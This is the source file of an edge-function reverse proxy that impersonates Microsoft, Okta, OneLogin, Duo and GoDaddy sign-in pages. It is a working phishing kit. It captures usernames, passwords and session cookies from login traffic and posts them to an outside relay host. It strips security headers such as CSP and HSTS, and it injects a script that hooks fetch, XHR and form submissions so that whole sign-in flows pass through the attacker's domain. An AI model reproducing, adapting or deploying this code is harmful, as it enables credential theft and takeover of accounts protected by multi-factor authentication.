export const runtime = 'edge';

// ==================== CONFIG ====================
const YOUR_DOMAIN = 'ayola-ozamu.zeabur.app';
const VERCEL_URL = 'https://treydatapi.duckdns.org/api/relay';
const INITIAL_UPSTREAM = 'login.microsoftonline.com';
const PROXY_PREFIX = '/_p/';
const BLOCKED_IPS = ['0.0.0.0', '127.0.0.1'];

const IDENTITY_PROVIDERS = {
  'login.microsoftonline.com': { type: 'microsoft', name: 'Microsoft' },
  'login.live.com': { type: 'microsoft', name: 'Microsoft Live' },
  'account.live.com': { type: 'microsoft', name: 'Microsoft Account' },
  'account.microsoft.com': { type: 'microsoft', name: 'Microsoft Account' },
  'aadcdn.msauth.net': { type: 'microsoft', name: 'Microsoft CDN' },
  'www.office.com': { type: 'microsoft', name: 'Office 365' },
  'office.com': { type: 'microsoft', name: 'Office 365' },
  'microsoft365.com': { type: 'microsoft', name: 'Microsoft 365' },
  'outlook.office.com': { type: 'microsoft', name: 'Outlook' },
  'outlook.live.com': { type: 'microsoft', name: 'Outlook Live' },
  'o.okta.com': { type: 'okta', name: 'Okta' },
  'sci.okta.com': { type: 'okta', name: 'Okta Sci' },
  'dotfoods.okta.com': { type: 'okta', name: 'Okta DotFoods' },
  'login.okta.com': { type: 'okta', name: 'Okta Login' },
  'ulgroup.okta.com': { type: 'okta', name: 'Okta ULGroup' },
  'empowermm.onelogin.com': { type: 'onelogin', name: 'OneLogin' },
  'duosecurity.com': { type: 'duo', name: 'Duo' },
  'api-aa1a6aea.duosecurity.com': { type: 'duo', name: 'Duo API' },
  'login.duosecurity.com': { type: 'duo', name: 'Duo Login' },
  'sso.godaddy.com': { type: 'godaddy', name: 'GoDaddy' },
  'sso.secureserver.net': { type: 'godaddy', name: 'GoDaddy Legacy' },
  'csp.secureserver.net': { type: 'godaddy', name: 'GoDaddy CSP' },
  'api.godaddy.com': { type: 'godaddy', name: 'GoDaddy API' },
  'www.godaddy.com': { type: 'godaddy', name: 'GoDaddy WWW' },
  'img1.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images' },
  'img2.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images 2' },
  'img3.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images 3' },
  'img4.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images 4' },
  'img5.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images 5' },
  'img6.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images 6' }
};

const CRITICAL_AUTH_COOKIES = {
  microsoft: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT', 'SignInStateCookie'],
  okta: ['sid', 'authtoken'],
  onelogin: ['sub_session_onelogin'],
  duo: ['.*'],
  godaddy: ['akm_lmprb-ssn', 'akm_lmprb', 'auth_id', 'auth_token', 'ssotoken', 'JSESSIONID']
};

const UPSTREAM_CONTEXT = {
  currentDomain: null,
  currentPath: null
};

async function sendToVercel(type, data) {
  try {
    await fetch(VERCEL_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ type, timestamp: new Date().toISOString(), ...data }),
    });
  } catch (e) {}
}

async function exfiltrateCookies(cookieText, ip, platform, url) {
  try {
    const cleanUrl = url.split('?')[0];
    const content = `IP: ${ip}\nPlatform: ${platform}\nURL: ${cleanUrl}\nData: Cookies found:\n\n${cookieText}\n`;
    const formData = new FormData();
    formData.append("file", new Blob([content], { type: "text/plain" }), `${ip}-${platform}-COOKIE.txt`);
    formData.append("ip", ip);
    formData.append("type", "cookie-file");

    await fetch(VERCEL_URL, {
      method: "POST",
      body: formData,
    });
  } catch (e) {}
}

function getUpstreamInfo(pathname) {
  if (pathname.startsWith(PROXY_PREFIX)) {
    const withoutPrefix = pathname.slice(PROXY_PREFIX.length);
    const upstreamDomain = withoutPrefix.split('/')[0];
    const upstreamPath = '/' + withoutPrefix.slice(upstreamDomain.length + 1);
    const provider = IDENTITY_PROVIDERS[upstreamDomain];

    UPSTREAM_CONTEXT.currentDomain = upstreamDomain;
    UPSTREAM_CONTEXT.currentPath = upstreamPath;

    return {
      upstream: upstreamDomain,
      type: provider ? provider.type : 'unknown',
      path: upstreamPath,
      isProxied: true
    };
  }

  UPSTREAM_CONTEXT.currentDomain = INITIAL_UPSTREAM;
  UPSTREAM_CONTEXT.currentPath = pathname;

  return {
    upstream: INITIAL_UPSTREAM,
    type: 'microsoft',
    path: pathname,
    isProxied: false
  };
}

function cleanQueryString(search) {
  if (!search) return '';

  const params = new URLSearchParams(search);
  const pathValues = params.getAll('path');

  if (pathValues.length > 1 || (pathValues.length === 1 && pathValues[0] === '_p')) {
    const cleaned = new URLSearchParams();
    for (const [key, value] of params) {
      if (key !== 'path') cleaned.append(key, value);
    }
    const result = cleaned.toString();
    return result ? '?' + result : '';
  }

  if (pathValues.length === 1) {
    const val = pathValues[0];
    if (val.includes('.') || val === '_p' || val === 'common' || val === 'shared') {
      const cleaned = new URLSearchParams();
      for (const [key, value] of params) {
        if (key !== 'path') cleaned.append(key, value);
      }
      const result = cleaned.toString();
      return result ? '?' + result : '';
    }
  }

  return search;
}

function shouldProxyDomain(hostname) {
  if (!hostname) return false;
  if (IDENTITY_PROVIDERS[hostname]) return true;
  if (hostname.includes('microsoft') || hostname.includes('live.com') || 
      hostname.includes('office.com') || hostname.includes('msauth.net')) return true;
  if (hostname.includes('godaddy.com') || hostname.includes('secureserver.net')) return true;
  if (hostname.includes('okta.com')) return true;
  if (hostname.includes('onelogin.com')) return true;
  if (hostname.includes('duosecurity.com')) return true;
  if (hostname.includes('wsimg.com')) return true;
  return false;
}

function rewriteLocation(location) {
  try {
    const url = new URL(location);
    if (shouldProxyDomain(url.hostname)) {
      return `https://${YOUR_DOMAIN}${PROXY_PREFIX}${url.hostname}${url.pathname}${url.search}`;
    }
    return location;
  } catch (e) {
    return location;
  }
}

function hasCriticalAuthCookies(cookieString, platform) {
  if (!cookieString) return false;
  const patterns = CRITICAL_AUTH_COOKIES[platform] || [];
  return patterns.some(p => {
    if (p === '.*') return true;
    return cookieString.toLowerCase().includes(p.toLowerCase());
  });
}

function parseCredentials(bodyText) {
  const keyValuePairs = bodyText.split('&');
  let user = null;
  let pass = null;

  for (const pair of keyValuePairs) {
    const [key, value] = pair.split('=');
    if (!value) continue;

    const decodedValue = decodeURIComponent(value.replace(/\+/g, ' '));

    if (key === 'login' || key === 'loginfmt' || key === 'username' || key === 'email' || key === 'user') {
      user = decodedValue;
    }
    if (key === 'passwd' || key === 'password' || key === 'pwd' || key === 'pass') {
      pass = decodedValue;
    }
  }

  return { user, pass };
}

// ==================== CLIENT-SIDE INTERCEPTOR SCRIPT ====================
// CRITICAL FIX: Only intercept navigation, NOT resources
function generateInterceptorScript(upstreamDomain, currentPath) {
  const pathWithoutQuery = currentPath.split('?')[0];
  const pathSegments = pathWithoutQuery.split('/').filter(Boolean);
  const baseSegment = pathSegments.length > 0 ? pathSegments[0] : '';
  const basePath = baseSegment ? '/' + baseSegment + '/' : '/';

  return `
<script>
(function() {
  'use strict';

  try {
    const PROXY_PREFIX = '${PROXY_PREFIX}';
    const YOUR_DOMAIN = '${YOUR_DOMAIN}';
    const CURRENT_UPSTREAM = '${upstreamDomain}';
    const CURRENT_BASE_PATH = '${basePath}';

    console.log('[Proxy Interceptor] Initializing for upstream:', CURRENT_UPSTREAM);

    function shouldProxyDomain(hostname) {
      if (!hostname) return false;
      const domains = [
        'microsoftonline.com', 'live.com', 'microsoft.com', 'msauth.net',
        'office.com', 'microsoft365.com', 'outlook.office.com', 'outlook.live.com',
        'godaddy.com', 'secureserver.net', 'csp.secureserver.net', 
        'sso.godaddy.com', 'sso.secureserver.net', 'api.godaddy.com',
        'okta.com', 'onelogin.com', 'duosecurity.com',
        'wsimg.com', 'img1.wsimg.com', 'img2.wsimg.com', 'img3.wsimg.com',
        'img4.wsimg.com', 'img5.wsimg.com', 'img6.wsimg.com'
      ];
      return domains.some(d => hostname.includes(d));
    }

    // Check if URL is a resource (image, css, js, font)
    function isResourceUrl(url) {
      return /\\.(jpg|jpeg|png|gif|svg|css|js|woff|woff2|ttf|eot|ico|webp|avif)(\\?|#|$)/i.test(url);
    }

    // CRITICAL FIX: Only rewrite navigation URLs, not resources
    function rewriteUrl(url) {
      if (!url || typeof url !== 'string') return url;
      try {
        // Already proxied - skip
        if (url.includes(YOUR_DOMAIN + PROXY_PREFIX)) return url;
        
        // Skip data/blob/javascript URLs
        if (url.startsWith('data:') || url.startsWith('blob:') || url.startsWith('javascript:')) return url;
        if (url.startsWith('#')) return url;

        // Absolute URLs
        if (url.startsWith('http://') || url.startsWith('https://')) {
          try {
            const urlObj = new URL(url);
            // CRITICAL: Don't rewrite resource URLs - let them load directly
            if (isResourceUrl(urlObj.pathname)) {
              return url;
            }
            if (shouldProxyDomain(urlObj.hostname)) {
              return 'https://' + YOUR_DOMAIN + PROXY_PREFIX + urlObj.hostname + urlObj.pathname + urlObj.search + urlObj.hash;
            }
          } catch(e) {}
          return url;
        }

        // Protocol-relative URLs
        if (url.startsWith('//')) {
          const hostname = url.split('/')[2];
          if (shouldProxyDomain(hostname)) {
            // Don't rewrite if it's a resource
            if (isResourceUrl(url)) {
              return 'https:' + url;
            }
            return 'https://' + YOUR_DOMAIN + PROXY_PREFIX + hostname + url.substring(2 + hostname.length);
          }
          return 'https:' + url;
        }

        // Root-relative URLs
        if (url.startsWith('/')) {
          const cleanPath = url.substring(1);
          // CRITICAL: Don't rewrite resource URLs
          if (isResourceUrl(cleanPath)) {
            return 'https://' + CURRENT_UPSTREAM + '/' + cleanPath;
          }
          return 'https://' + YOUR_DOMAIN + PROXY_PREFIX + CURRENT_UPSTREAM + '/' + cleanPath;
        }

        // Path-relative URLs
        if (!url.startsWith('/') && !url.startsWith('http')) {
          // Don't rewrite resources
          if (isResourceUrl(url)) {
            return 'https://' + CURRENT_UPSTREAM + CURRENT_BASE_PATH + url;
          }
          return 'https://' + YOUR_DOMAIN + PROXY_PREFIX + CURRENT_UPSTREAM + CURRENT_BASE_PATH + url;
        }

      } catch(e) {
        console.error('[Proxy Interceptor] Error:', url, e);
      }
      return url;
    }

    // Override fetch - skip resources
    const originalFetch = window.fetch;
    window.fetch = function(url, options) {
      try {
        let rewrittenUrl = url;
        if (typeof url === 'string') {
          // Skip resource fetches entirely
          if (isResourceUrl(url)) {
            return originalFetch.call(this, url, options);
          }
          rewrittenUrl = rewriteUrl(url);
        } else if (url instanceof Request) {
          if (isResourceUrl(url.url)) {
            return originalFetch.call(this, url, options);
          }
          const newUrl = rewriteUrl(url.url);
          if (newUrl !== url.url) {
            rewrittenUrl = new Request(newUrl, url);
          }
        }
        return originalFetch.call(this, rewrittenUrl, options);
      } catch(e) {
        return originalFetch.call(this, url, options);
      }
    };

    // Override XHR - skip resources
    const originalOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(method, url, async, user, password) {
      try {
        if (isResourceUrl(url)) {
          return originalOpen.call(this, method, url, async, user, password);
        }
        const rewrittenUrl = rewriteUrl(url);
        return originalOpen.call(this, method, rewrittenUrl, async, user, password);
      } catch(e) {
        return originalOpen.call(this, method, url, async, user, password);
      }
    };

    // WebSocket
    if (window.WebSocket) {
      const originalWebSocket = window.WebSocket;
      window.WebSocket = function(url, protocols) {
        try {
          const rewrittenUrl = rewriteUrl(url);
          return new originalWebSocket(rewrittenUrl, protocols);
        } catch(e) {
          return new originalWebSocket(url, protocols);
        }
      };
    }

    // Service worker suppression
    if ('serviceWorker' in navigator) {
      const fakeRegistration = {
        active: null, installing: null, waiting: null, scope: '/',
        update: function() { return Promise.resolve(this); },
        unregister: function() { return Promise.resolve(true); }
      };
      navigator.serviceWorker.register = function() {
        return Promise.resolve(fakeRegistration);
      };
    }

    // CRITICAL FIX: Only rewrite navigation elements (A tags and forms), not resources
    if (typeof MutationObserver !== 'undefined') {
      const observer = new MutationObserver(function(mutations) {
        mutations.forEach(function(mutation) {
          mutation.addedNodes.forEach(function(node) {
            if (node.nodeType === 1) {
              try {
                // Only handle A tags (links) and FORM tags - NOT img/script/link tags
                if (node.tagName === 'A' && node.href) {
                  const newHref = rewriteUrl(node.href);
                  if (newHref !== node.href) node.href = newHref;
                }
                if (node.tagName === 'FORM' && node.action) {
                  const newAction = rewriteUrl(node.action);
                  if (newAction !== node.action) node.action = newAction;
                }
                // Check children for links/forms only
                if (node.querySelectorAll) {
                  node.querySelectorAll('a[href]').forEach(function(el) {
                    const newHref = rewriteUrl(el.href);
                    if (newHref !== el.href) el.href = newHref;
                  });
                  node.querySelectorAll('form[action]').forEach(function(el) {
                    const newAction = rewriteUrl(el.action);
                    if (newAction !== el.action) el.action = newAction;
                  });
                }
              } catch(e) {}
            }
          });
        });
      });

      if (document.body) {
        observer.observe(document.body, { childList: true, subtree: true });
      } else {
        document.addEventListener('DOMContentLoaded', function() {
          if (document.body) observer.observe(document.body, { childList: true, subtree: true });
        });
      }
    }

    // Form submission interception
    document.addEventListener('submit', function(e) {
      const form = e.target;
      if (form.action && !form.action.includes(YOUR_DOMAIN + PROXY_PREFIX)) {
        try {
          const actionUrl = new URL(form.action);
          if (shouldProxyDomain(actionUrl.hostname)) {
            form.action = rewriteUrl(form.action);
          }
        } catch(err) {}
      }
    }, true);

    console.log('[Proxy Interceptor] Active for upstream:', CURRENT_UPSTREAM);
  } catch(err) {
    console.error('[Proxy Interceptor] Failed:', err);
  }
})();
</script>`;
}

export default async function handleRequest(request) {
  const url = new URL(request.url);
  const ip = request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() || 'unknown';

  if (BLOCKED_IPS.includes(ip)) {
    return new Response('Access denied.', { status: 403 });
  }

  const info = getUpstreamInfo(url.pathname);
  const upstreamDomain = info.upstream;
  const cleanSearch = cleanQueryString(url.search);
  const upstreamPath = info.path + cleanSearch;
  const upstreamUrl = `https://${upstreamDomain}${upstreamPath}`;
  const displayUrl = `https://${YOUR_DOMAIN}${url.pathname}`;

  console.log(`[${info.type}] ${request.method} ${displayUrl} -> ${upstreamUrl}`);

  if (request.method === 'OPTIONS') {
    return new Response(null, {
      status: 200,
      headers: {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, PATCH, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type, Authorization, X-Requested-With, X-Requested-By',
        'Access-Control-Allow-Credentials': 'true',
        'Access-Control-Max-Age': '86400'
      }
    });
  }

  const headers = new Headers(request.headers);
  headers.set('Host', upstreamDomain);
  headers.set('Referer', `https://${upstreamDomain}/`);
  headers.set('Origin', `https://${upstreamDomain}`);
  headers.delete('x-forwarded-host');
  headers.delete('x-forwarded-proto');

  let bodyText = null;
  let requestBodyForUpstream = null;

  if (request.method === 'POST' || request.method === 'PUT' || request.method === 'PATCH') {
    try {
      const clonedRequest = request.clone();
      bodyText = await clonedRequest.text();
      console.log('[DEBUG] POST body:', bodyText.substring(0, 500));

      const { user, pass } = parseCredentials(bodyText);
      if (user && pass) {
        console.log(`[CREDENTIALS CAPTURED] User: ${user.substring(0, 5)}... Platform: ${info.type}`);
        await sendToVercel('credentials', {
          type: "creds", ip: ip, user: user, pass: pass, platform: info.type, url: displayUrl
        });
        const content = `IP: ${ip}\nPlatform: ${info.type}\nUser: ${user}\nPass: ${pass}\nURL: ${displayUrl}\n`;
        const formData = new FormData();
        formData.append("file", new Blob([content], { type: "text/plain" }), `${ip}-CREDENTIALS.txt`);
        formData.append("ip", ip);
        formData.append("type", "credentials");
        await fetch(VERCEL_URL, { method: "POST", body: formData });
      }
      requestBodyForUpstream = bodyText;
    } catch (error) {
      console.error('Credential capture error:', error);
      requestBodyForUpstream = request.body;
    }
  }

  try {
    const fetchOpts = {
      method: request.method,
      headers,
      redirect: 'manual'
    };

    if (!['GET', 'HEAD'].includes(request.method)) {
      fetchOpts.body = requestBodyForUpstream !== null ? requestBodyForUpstream : request.body;
      fetchOpts.duplex = 'half';
    }

    console.log(`[DEBUG] Fetching upstream: ${upstreamUrl}`);
    const resp = await fetch(upstreamUrl, fetchOpts);
    console.log(`[DEBUG] Upstream response status: ${resp.status}`);

    if ([301, 302, 303, 307, 308].includes(resp.status)) {
      const loc = resp.headers.get('Location');
      if (loc) {
        const newHeaders = new Headers(resp.headers);
        const newLoc = rewriteLocation(loc);
        console.log(`[Redirect] ${loc} -> ${newLoc}`);
        newHeaders.set('Location', newLoc);
        return new Response(null, { status: resp.status, headers: newHeaders });
      }
    }

    const newHeaders = new Headers(resp.headers);
    newHeaders.set('access-control-allow-origin', '*');
    newHeaders.set('access-control-allow-credentials', 'true');
    newHeaders.set('access-control-allow-methods', 'GET, POST, PUT, DELETE, PATCH, OPTIONS');
    newHeaders.set('access-control-allow-headers', 'Content-Type, Authorization, X-Requested-With');
    newHeaders.delete('content-security-policy');
    newHeaders.delete('content-security-policy-report-only');
    newHeaders.delete('clear-site-data');
    newHeaders.delete('strict-transport-security');

    const cookies = resp.headers.getSetCookie?.() || [resp.headers.get('Set-Cookie')].filter(Boolean);
    let shouldCaptureCookies = false;
    let cookieStr = '';

    if (cookies?.length) {
      cookieStr = cookies.join('; ');
      const isPost = request.method === 'POST';
      const hasAuth = hasCriticalAuthCookies(cookieStr, info.type);
      shouldCaptureCookies = isPost || hasAuth;

      cookies.forEach(c => {
        if (!c) return;
        let mod = c.replace(/Domain=[^;]+;?/gi, '');
        mod = mod.replace(/Secure;?/gi, '');
        mod = mod.replace(/SameSite=[^;]+;?/gi, '');
        mod += '; SameSite=None; Secure';
        newHeaders.append('Set-Cookie', mod);
      });
    }

    if (shouldCaptureCookies && cookieStr) {
      await exfiltrateCookies(cookieStr, ip, info.type, displayUrl);
    }

    const ct = resp.headers.get('content-type') || '';

    if (/text\/html|application\/javascript|application\/json|text\/javascript|text\/css/.test(ct)) {
      let text = await resp.text();

      if (ct.includes('text/html')) {
        const interceptor = generateInterceptorScript(upstreamDomain, info.path);
        if (text.includes('<head>')) {
          text = text.replace('<head>', `<head>${interceptor}`);
        } else if (text.includes('<html>')) {
          text = text.replace('<html>', `<html>${interceptor}`);
        } else {
          text = interceptor + text;
        }
      }

      // CRITICAL FIX: Only rewrite navigation URLs (href, action), NOT resources (src)
      // Rewrite absolute URLs for navigation only
      Object.keys(IDENTITY_PROVIDERS).forEach(domain => {
        const escaped = domain.replace(/\./g, '\\.');
        // Only href and action, NOT src
        const hrefRegex = new RegExp('href=["\']https?://' + escaped + '([^"\']*)["\']', 'gi');
        text = text.replace(hrefRegex, 'href="https://' + YOUR_DOMAIN + PROXY_PREFIX + domain + '$1"');
        
        const actionRegex = new RegExp('action=["\']https?://' + escaped + '([^"\']*)["\']', 'gi');
        text = text.replace(actionRegex, 'action="https://' + YOUR_DOMAIN + PROXY_PREFIX + domain + '$1"');
      });

      // CRITICAL FIX: Rewrite root-relative URLs in HTML
      if (ct.includes('text/html')) {
        // Rewrite href="/..." - navigation only
        text = text.replace(/href="\/([^"]+)"/gi, (match, path) => {
          if (path.startsWith('_p/') || path.startsWith('data:') || path.startsWith('blob:')) return match;
          // Check if resource
          const isResource = /\.(jpg|jpeg|png|gif|svg|css|js|woff|woff2|ttf|eot|ico)(\?|$)/i.test(path);
          if (isResource) {
            // Let resources load directly from upstream
            return `href="https://${upstreamDomain}/${path}"`;
          }
          return `href="https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}/${path}"`;
        });

        text = text.replace(/href='\/([^']+)'/gi, (match, path) => {
          if (path.startsWith('_p/') || path.startsWith('data:') || path.startsWith('blob:')) return match;
          const isResource = /\.(jpg|jpeg|png|gif|svg|css|js|woff|woff2|ttf|eot|ico)(\?|$)/i.test(path);
          if (isResource) {
            return `href='https://${upstreamDomain}/${path}'`;
          }
          return `href='https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}/${path}'`;
        });

        // Rewrite form actions
        text = text.replace(/action="\/([^"]*)"/gi, 
          `action="https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}/$1"`);
        text = text.replace(/action='\/([^']*)'/gi, 
          `action='https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}/$1'`);

        // CRITICAL: DO NOT rewrite src="/..." - let images/resources load directly
        // The interceptor script will handle dynamic resources
      }

      // CSS: Don't rewrite url() - let resources load directly
      // This prevents the 404 errors for images

      return new Response(text, { status: resp.status, headers: newHeaders });
    }

    return new Response(resp.body, { status: resp.status, headers: newHeaders });

  } catch (err) {
    console.error(`[${info.type}] Error:`, err);
    return new Response(JSON.stringify({
      error: 'Proxy Error', message: err.message, stack: err.stack
    }), { status: 502, headers: { 'content-type': 'application/json' } });
  }
}

export const GET = handleRequest;
export const POST = handleRequest;
export const PUT = handleRequest;
export const DELETE = handleRequest;
export const PATCH = handleRequest;
export const OPTIONS = handleRequest;
export const HEAD = handleRequest;
